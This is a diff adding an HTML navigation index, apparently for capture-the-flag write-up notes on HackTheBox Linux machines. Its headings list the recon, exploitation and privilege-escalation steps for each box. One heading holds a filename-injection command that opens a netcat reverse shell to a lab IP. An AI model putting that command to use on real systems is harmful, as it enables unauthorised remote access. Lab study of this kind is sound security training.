+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---uploads.html">/uploads</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---backup.html">/backup</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---backup--extract_backup.tar.html">extract backup.tar</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--nikto.html">nikto</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--upload.php_backup.html">upload.php backup</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--magic_bytes_for_png.html">magic bytes for png</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--upload_cmd.php.html">upload cmd.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--cmd.php_RCE.html">cmd.php RCE</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly.html">privesc to guly</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php.html">check_attack.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--exfiltrate_file_with_base64_encode.html">exfiltrate file with base64 encode</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--lib.php_changes.html">lib.php changes?</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--scandir.html">scandir</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--touch_--_';_nc_-c_bash_10.10.14.62_1234.php'.html">touch -- '; nc -c bash 10.10.14.62 1234.php'</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--reverse_shell.html">reverse shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root.html">priv esc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root--changename.sh.html">changename.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root--changename.sh--vuln.html">vuln</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root--changename.sh--POC.html">POC</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel.html">LaCasaDePapel</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--nmapAuto.html">nmapAuto</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--nmapAuto--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--nmapAuto--nmap--recon.html">recon</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--nmapAuto--nmap--recon--nikto.html">nikto</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--nmapAuto--nmap--recon--gobuster.html">gobuster</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit.html">vsftp 2.3.4 exploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--open_backdoor_on_port_6200_with_).html">open backdoor on port 6200 with :)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--open_backdoor_on_port_6200_with_)--rlwrap_nc_to_port_6200.html">rlwrap nc to port 6200</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--open_backdoor_on_port_6200_with_)--rlwrap_nc_to_port_6200--phpinfo().html">phpinfo()</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--open_backdoor_on_port_6200_with_)--rlwrap_nc_to_port_6200--scandir.html">scandir</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--interesting_files.html">interesting files</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--interesting_files--ls_$tokyo.html">ls $tokyo</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--interesting_files--using_vi_to_clean_up_nairobi's_key.html">using vi to clean up nairobi's key</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--interesting_files--using_vi_to_clean_up_nairobi's_key--nairobi's_public_key.html">nairobi's public key</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--vsftp_2.3.4_exploit--interesting_files---etc-passwd.html">/etc/passwd</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--https.html">https</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--https--dl_cert.html">dl cert</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--https--dl_cert--compare_public_keys_of_nairobi's_key_and_webserver's_key.html">compare public keys of nairobi's key and webserver's key</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--generate_client_key.html">generate client key</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--generate_client_key--certificate_sign_request_data.html">certificate sign request data</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--generate_client_key--convert_to_PKCS12.html">convert to PKCS12</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--generate_client_key--convert_to_PKCS12--info.html">info</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--generate_client_key--add_key_to_firefox_certificate_store.html">add key to firefox certificate store</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--generate_client_key--add_ca.crt_to_firefox.html">add ca.crt to firefox</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--generate_client_key--refresh_page.html">refresh page</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--Local_file_Inclusion_Vuln.html">Local file Inclusion Vuln</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--Local_file_Inclusion_Vuln--.ssh.html">.ssh</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--ssh_into_professor_acct.html">ssh into professor acct</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--initial_foothold--user.txt.html">user.txt</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--privesc--pspy.html">pspy</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--privesc--memcache.ini.html">memcache.ini</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--privesc--using_professor's_directory_ownership_to_our_advantage.html">using professor's directory ownership to our advantage</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--privesc--revshell.html">revshell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--LaCasaDePapel--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops.html">devoops</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--nmapAutomator.sh.html">nmapAutomator.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--nmapAutomator.sh--recon.html">recon</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--nmapAutomator.sh--recon--gobuster.html">gobuster</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--nmapAutomator.sh--recon--nikto.html">nikto</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--http_(port_5000)_gunicorn.html">http (port 5000) gunicorn</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--http_(port_5000)_gunicorn---feed.html">/feed</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--http_(port_5000)_gunicorn---upload.html">/upload</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--http_(port_5000)_gunicorn---upload--test.xml.html">test.xml</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--XML_XXE_Injection_foothold.html">XML XXE Injection foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--XML_XXE_Injection_foothold--payloadallthethings_XXE.html">payloadallthethings XXE</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--XML_XXE_Injection_foothold---etc-password.html">/etc/password</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--XML_XXE_Injection_foothold--leak_user.txt.html">leak user.txt</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--XML_XXE_Injection_foothold---.ssh-id_rsa.html">/.ssh/id_rsa</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--XML_XXE_Injection_foothold--ssh_login.html">ssh login</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc--LinEnum.sh.html">LinEnum.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc--roosa_bash_history.html">roosa bash_history</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc--git_log.html">git log</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc--git_log--reverted_accidental_commit__log.html">"reverted accidental commit " log</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc--git_log--git_show.html">git show</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc--git_log--git_show--unknown_id_rsa.html">unknown id_rsa</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--privesc--ssh_to_root.html">ssh to root</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--devoops--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--devoops--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF).html">safe (linux BoF)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--nmapAutomator.html">nmapAutomator</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--http--port_1337.html">port 1337</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--ghidra.html">ghidra</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow.html">buffer overflow</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--checksec.html">checksec</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_1_crash_the_application.html">step 1: crash the application</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_2_find_the_offset.html">step 2: find the offset</a></li>
+<ol>
+<li><a href="afe_(linux_BoF)--initial_foothold--buffer_overflow--step_2_find_the_offset--overwriting_$rsp_register_to_test_calling_main_function_twice.html">overwriting $rsp register to test calling main function twice</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_3_hijack_system_call.html">step 3: hijack system call</a></li>
+<li><a href="ox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_4_collect_all_the_necessary_parameters_for_a_ROP_chain_exploit.html">step 4: collect all the necessary parameters for a ROP chain exploit</a></li>
+<ol>
+<li><a href="es--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_4_collect_all_the_necessary_parameters_for_a_ROP_chain_exploit--disass_main.html">disass main</a></li>
+<li><a href="es--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_4_collect_all_the_necessary_parameters_for_a_ROP_chain_exploit--disass_test.html">disass test</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_5_write_exploit.py.html">step 5 write exploit.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_5_write_exploit.py--tweak_for_safe_box.html">tweak for safe box</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--step_5_write_exploit.py--run.html">run</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--initial_foothold--buffer_overflow--obj_dump_system_&_test.html">obj dump system & test</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation.html">privilege escalation</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation--dropping_ssh_key.html">dropping ssh key</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation--exfiltrate_keepass.html">exfiltrate keepass</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation--crack_keepass.html">crack keepass</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation--crack_keepass--organize_picture_files_hashes.html">organize picture files hashes</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation--crack_keepass--hashcat.html">hashcat</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation--kpcli.html">kpcli</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--privilege_escalation--sudo_into_root.html">sudo into root</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--safe_(linux_BoF)--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight.html">lightweight</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--nmapAuto.html">nmapAuto</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--nmapAuto--nmap_vulns.html">nmap vulns</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ldap.html">ldap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ldap--ldapsearch_with_DC.html">ldapsearch with DC</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ldap--ldapsearch_with_DC--passwords.html">passwords</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ldap--ldapsearch_with_DC--$6$x_module.html">$6$x module</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--http--info.php.html">info.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--http--status.php.html">status.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--http--user.php.html">user.php</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ssh.html">ssh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ssh---etc-passwd.html">/etc/passwd</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ssh--LinEnum.html">LinEnum</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--ssh--LinEnum--report.html">report</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--wireshark.html">wireshark</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--wireshark--tcpdmp.html">tcpdmp</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--wireshark--lightweight.ens33.cap.html">lightweight.ens33.cap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--wireshark--refresh_all_the_webpages_and_intercept_LDAP_packets.html">refresh all the webpages and intercept LDAP packets</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--wireshark--privesc_to_ldapuser2.html">privesc to ldapuser2</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_ldapuser1.html">privesc to ldapuser1</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_ldapuser1--7z2John.html">7z2John</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_ldapuser1--hashcat_the_7z2john_hash.html">hashcat the 7z2john hash</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_ldapuser1--unzip_7z_w-_pass.html">unzip 7z w/ pass</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_ldapuser1--unzip_7z_w-_pass--status.php.html">status.php</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_ldapuser1--privesc.html">privesc</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_root--gtfo_bins_openssl.html">gtfo bins openssl</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_root--testing_openssl_to_view_-etc-shadow.html">testing openssl to view /etc/shadow</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--privesc_to_root--privesc_via_sudoers_config_file.html">privesc via sudoers config file</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--lightweight--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk.html">hawk</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--nmapAuto.html">nmapAuto</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--nmapAuto--vuln_scan.html">vuln scan</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--nmapAuto--udp_scan.html">udp scan</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--nmapAuto--recon.html">recon</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--nmapAuto--recon--droopescan.html">droopescan</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--http80,_8082_&_9092.html">http:80, 8082 & 9092</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--ftp.html">ftp</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--ftp--drupal.txt.enc.html">drupal.txt.enc</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--ftp--bruteforce-salted-openssl.html">bruteforce-salted-openssl</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--ftp--dropal.txt.enc_contents.html">dropal.txt.enc contents</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--initial_foothold--dropal_login.html">dropal login</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--initial_foothold--dropal_login--droopescan.html">droopescan</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--initial_foothold--dropal_login--droopescan--enable_php_module.html">enable php module</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--initial_foothold--dropal_login--droopescan--php_reverse_shell.html">php reverse shell</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--initial_foothold--dropal_login--droopescan--php_system_RCE.html">php system RCE</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc.html">priv esc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--LinEnum.sh.html">LinEnum.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--easy_way_(45506.py).html">easy way (45506.py)</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--ippsec_way.html">ippsec way</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--ippsec_way--find_resused_password_in_-var-www-html_settings.php_file.html">find resused password in /var/www/html settings.php file</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--ippsec_way--ssh_to_port_8082_locally_with_daniel_user.html">ssh to port 8082 locally with daniel user</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--ippsec_way--H2_exploit.html">H2 exploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--ippsec_way--H2_exploit--logging_in_with_arbitrary_database__name.html">logging in with arbitrary database  name</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--ippsec_way--H2_exploit--RCE.html">RCE</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--priv_esc--ippsec_way--H2_exploit--rev_shell.html">rev shell</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--hawk--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--hawk--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail.html">jail</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--nmapAutomator.html">nmapAutomator</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--http--gobuster--prisoner.html.html">prisoner.html</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--http--gobuster--jailuser.html">jailuser</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--http--gobuster--jailuser--jailuser-dev.html">jailuser/dev</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--http--gobuster--jailuser--jailuser-dev--jailuser.c.html">jailuser.c</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--http--gobuster--jailuser--jailuser-dev--jail.html">jail</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--http--gobuster--jailuser--jailuser-dev--compile.sh.html">compile.sh</a></li>
+</ol>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--gdb_.-jail.html">gdb ./jail</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--gdb_.-jail--checksec.html">checksec</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow.html">Buffer Overflow</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow--skeleton_code.html">skeleton code</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow--crash_the_program.html">crash the program</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow--find_offset.html">find offset</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow--mem_leak.html">mem leak</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow--socket_reuse_x32_shellcode.html">socket reuse x32 shellcode</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow--socket_reuse_x32_shellcode--shellstorm_x32_reverse_shellcode.html">shellstorm x32 reverse shellcode</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--initial_foothold--Buffer_Overflow--exploit.py.html">exploit.py</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_nobody_to_frank.html">priv esc from nobody to frank</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_nobody_to_frank--nfs_version_3.html">nfs version 3</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_nobody_to_frank--nfs_version_3--setuid.c.html">setuid.c</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_nobody_to_frank--nfs_version_3--setuid_to_frank.html">setuid to frank</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_frank_to_adm.html">priv esc from frank to adm</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_frank_to_adm--generate_ssh_key.html">generate ssh key</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_frank_to_adm--generate_ssh_key--drop_key_into_.ssh-authorized_keys.html">drop key into .ssh/authorized_keys</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_frank_to_adm--breaking_out_of_rvim.html">breaking out of rvim</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root.html">priv esc from adm to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--decode_frank.html">decode frank</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--alcatraz_history.html">alcatraz history</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--keys.rar.html">keys.rar</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--keys.rar--unrar.html">unrar</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--keys.rar--breaking_keys.rar.html">breaking keys.rar</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--keys.rar--rar2john.html">rar2john</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--keys.rar--john.html">john</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--RsaCtfTool.html">RsaCtfTool</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--priv_esc_from_adm_to_root--RsaCtfTool--ssh_into_root.html">ssh into root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jail--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jail--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--blocky.html">blocky</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--blocky--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--blocky--gobuster---plugins.html">/plugins</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--blocky--blockycore.jar.html">blockycore.jar</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--blocky--blockycore.jar--strings_blockycore.class.html">strings blockycore.class</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--blocky--wpscan_enumerate_users.html">wpscan enumerate users</a></li>
+<li><a href="HacktheBox--Linux_Boxes--blocky--intial_foothold.html">intial foothold</a></li>
+<li><a href="HacktheBox--Linux_Boxes--blocky--privesc.html">privesc</a></li>
+<li><a href="HacktheBox--Linux_Boxes--blocky--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--blocky--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin.html">openadmin</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--openadmin--http.html">http</a></li>
+<ol>
